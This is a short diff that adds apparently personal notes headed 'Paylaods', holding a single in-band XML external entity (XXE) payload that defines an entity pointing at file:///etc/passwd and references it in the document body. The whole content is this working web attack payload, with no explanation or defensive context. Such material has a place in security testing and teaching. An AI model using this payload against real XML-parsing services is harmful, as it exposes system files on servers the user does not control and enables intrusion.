@@ -1,0 +1,5 @@
+Paylaods
+    inband payload
+    *<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>*
